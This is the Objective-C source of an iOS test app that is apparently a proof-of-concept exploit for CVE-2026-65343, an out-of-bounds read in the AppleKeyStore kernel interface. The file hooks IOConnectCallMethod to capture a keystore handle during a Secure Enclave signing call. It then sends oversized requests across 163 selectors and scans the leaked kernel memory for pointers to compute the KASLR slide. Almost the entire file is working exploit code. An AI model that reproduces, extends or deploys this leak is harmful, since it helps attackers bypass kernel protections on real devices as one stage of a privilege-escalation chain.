//
//  ViewController.m
//  Test — CVE-2026-65343 AppleKeyStore OOB read → KASLR
//
#import "ViewController.h"
#import <stdint.h>
#import <string.h>
#import <stdio.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <Security/Security.h>
#import <Foundation/Foundation.h>

static UITextView *g_log;
static void logline(NSString *s) {
    NSLog(@"%@", s);
    dispatch_async(dispatch_get_main_queue(), ^{
        g_log.text = [g_log.text stringByAppendingFormat:@"%@\n", s];
    });
}

#ifndef DYLD_INTERPOSE
#define DYLD_INTERPOSE(_replacement, _replacee)                          \
    __attribute__((used))                                                 \
    static struct { const void *replacement; const void *replacee; }     \
    _interpose_##_replacee                                                \
    __attribute__((section("__DATA,__interpose"))) = {                   \
        (const void *)(unsigned long)&(_replacement),                    \
        (const void *)(unsigned long)&(_replacee)                        \
    };
#endif

typedef kern_return_t (*IOConnectCallMethod_fn)(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static volatile int          g_capture_armed = 0;
static volatile int          g_capture_done  = 0;
static volatile io_connect_t g_cap_conn      = 0;
static uint8_t               g_cap_handle[16];

static kern_return_t real_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    static IOConnectCallMethod_fn fn = NULL;
    if (!fn) fn = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    if (!fn) return KERN_FAILURE;
    return fn(conn, sel, scalin, scalin_cnt,
              structin, structin_sz,
              scalout, scalout_cnt,
              structout, structout_sz);
}

static kern_return_t my_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    if (g_capture_armed && !g_capture_done && structin && structin_sz >= 16) {
        const uint8_t *hdr = (const uint8_t *)structin;
        int nonzero = 0;
        for (int k = 0; k < 16; k++) if (hdr[k]) { nonzero = 1; break; }
        if (nonzero) {
            g_cap_conn = conn;
            memcpy(g_cap_handle, hdr, 16);
            __asm__ __volatile__("dmb ish" ::: "memory");
            g_capture_done = 1;
            logline([NSString stringWithFormat:@"[capture] conn=%#x sel=%u handle=%02x%02x%02x%02x%02x%02x%02x%02x...",
                     conn, sel, hdr[0],hdr[1],hdr[2],hdr[3],hdr[4],hdr[5],hdr[6],hdr[7]]);
        }
    }
    return real_IOConnectCallMethod(conn, sel, scalin, scalin_cnt,
                                    structin, structin_sz,
                                    scalout, scalout_cnt,
                                    structout, structout_sz);
}

DYLD_INTERPOSE(my_IOConnectCallMethod, IOConnectCallMethod)

static int trigger_se_iokit_call(void) {
    logline(@"[se] creating SE key (no biometric)...");
    NSData *tag = [NSData dataWithBytes:"com.research.poc.aksprobe" length:25];
    NSDictionary *delQ = @{
        (id)kSecClass: (id)kSecClassKey,
        (id)kSecAttrApplicationTag: tag,
    };
    SecItemDelete((__bridge CFDictionaryRef)delQ);
    CFErrorRef cfErr = NULL;
    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
        kCFAllocatorDefault, kSecAttrAccessibleAfterFirstUnlock, 0, &cfErr);
    if (!acl) { logline(@"[se] acl fail"); return 0; }
    NSDictionary *attrs = @{
        (id)kSecAttrKeyType: (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @256,
        (id)kSecAttrTokenID: (id)kSecAttrTokenIDSecureEnclave,
        (id)kSecAttrAccessControl: (__bridge id)acl,
        (id)kSecPrivateKeyAttrs: @{(id)kSecAttrIsPermanent: @YES, (id)kSecAttrApplicationTag: tag},
    };
    SecKeyRef privKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &cfErr);
    CFRelease(acl);
    if (!privKey) {
        NSString *d = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
        logline([NSString stringWithFormat:@"[se] key fail: %@", d]);
        if (cfErr) CFRelease(cfErr);
        return 0;
    }
    logline(@"[se] key OK, signing...");
    const uint8_t msg[32] = {0xDE,0xAD,0xBE,0xEF};
    CFDataRef msgRef = CFDataCreate(NULL, msg, 32);
    CFErrorRef sigErr = NULL;
    CFDataRef sig = SecKeyCreateSignature(privKey,
        kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &sigErr);
    CFRelease(msgRef); CFRelease(privKey);
    if (sig) { logline([NSString stringWithFormat:@"[se] sign OK %ld bytes", (long)CFDataGetLength(sig)]); CFRelease(sig); return 1; }
    NSString *d = sigErr ? [(__bridge NSError *)sigErr description] : @"?";
    logline([NSString stringWithFormat:@"[se] sign fail: %@", d]);
    if (sigErr) CFRelease(sigErr);
    return g_capture_done ? 1 : 0;
}

#define OUTBUF_SZ 0x2000
#define FILL_BYTE 0xBB
#define DECLARED  0x0800u
#define KERN_BASE_STATIC 0xfffffff007004000ULL

static int looks_like_kptr(uint64_t v) {
    return ((v >> 32) == 0xfffffff0) && (v & 0xffffffffULL) != 0;
}

static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int sel) {
    uint8_t msg[28];
    memset(msg, 0, sizeof(msg));
    memcpy(msg, handle, 16);
    uint32_t decl = DECLARED;
    memcpy(msg + 24, &decl, 4);
    static uint8_t outbuf[OUTBUF_SZ];
    memset(outbuf, FILL_BYTE, OUTBUF_SZ);
    size_t outsz = OUTBUF_SZ;
    uint64_t scalo[8] = {0};
    uint32_t scaln = 8;
    kern_return_t kr = real_IOConnectCallMethod(
        conn, (uint32_t)sel, NULL, 0, msg, sizeof(msg),
        scalo, &scaln, outbuf, &outsz);
    (void)kr;
    uint64_t slide = 0;
    for (size_t i = 0; i + 8 <= outsz; i += 8) {
        uint64_t v = 0;
        memcpy(&v, outbuf + i, 8);
        if (looks_like_kptr(v)) {
            logline([NSString stringWithFormat:@"  sel=%d KPTR @+%04zx = %#018llx", sel, i, v]);
            if (!slide) {
                uint64_t known_off = 0x18d8774ULL;
                if ((v & 0xfffULL) == ((KERN_BASE_STATIC + known_off) & 0xfffULL)) {
                    slide = v - (KERN_BASE_STATIC + known_off);
                    logline([NSString stringWithFormat:@"  -> KASLR slide = %#llx", slide]);
                }
            }
        }
    }
    return slide;
}

@implementation ViewController

- (void)runProbe {
    logline(@"=== AKS OOB probe ===");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
    if (!svc) { logline(@"service not found"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) { logline([NSString stringWithFormat:@"open fail %#x", (unsigned)kr]); return; }
    logline([NSString stringWithFormat:@"open conn=%#x", conn]);

    g_capture_armed = 0; g_capture_done = 0; g_cap_conn = 0; memset(g_cap_handle, 0, 16);
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_capture_armed = 1;
    __asm__ __volatile__("dmb ish" ::: "memory");
    int se_ok = trigger_se_iokit_call();
    (void)se_ok;
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_capture_armed = 0;

    NSData *tag = [NSData dataWithBytes:"com.research.poc.aksprobe" length:25];
    NSDictionary *delQ = @{(id)kSecClass:(id)kSecClassKey,(id)kSecAttrApplicationTag:tag};
    SecItemDelete((__bridge CFDictionaryRef)delQ);

    if (!g_capture_done || !g_cap_conn) {
        logline(@"phase1 fail - fallback zero-handle probe");
        uint8_t zero_handle[16] = {0};
        for (int sel = 1; sel <= 163; sel++) {
            uint64_t slide = probe_selector(conn, zero_handle, sel);
            if (slide) break;
        }
        return;
    }
    logline(@"phase1 OK - probing selectors with real handle");
    for (int sel = 1; sel <= 163; sel++) {
        uint64_t slide = probe_selector((io_connect_t)g_cap_conn, g_cap_handle, sel);
        if (slide) break;
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.frame = CGRectMake(20, 80, self.view.bounds.size.width - 40, 60);
    [btn setTitle:@"AKS OOB PROBE" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor systemBlueColor];
    btn.layer.cornerRadius = 10;
    btn.titleLabel.font = [UIFont boldSystemFontOfSize:22];
    [btn addTarget:self action:@selector(runProbe) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    g_log = [[UITextView alloc] initWithFrame:CGRectMake(10, 160, self.view.bounds.size.width - 20, self.view.bounds.size.height - 180)];
    g_log.backgroundColor = [UIColor darkGrayColor];
    g_log.textColor = [UIColor greenColor];
    g_log.font = [UIFont fontWithName:@"Menlo" size:11];
    g_log.editable = NO;
    g_log.text = @"press AKS OOB PROBE\n";
    [self.view addSubview:g_log];
}

@end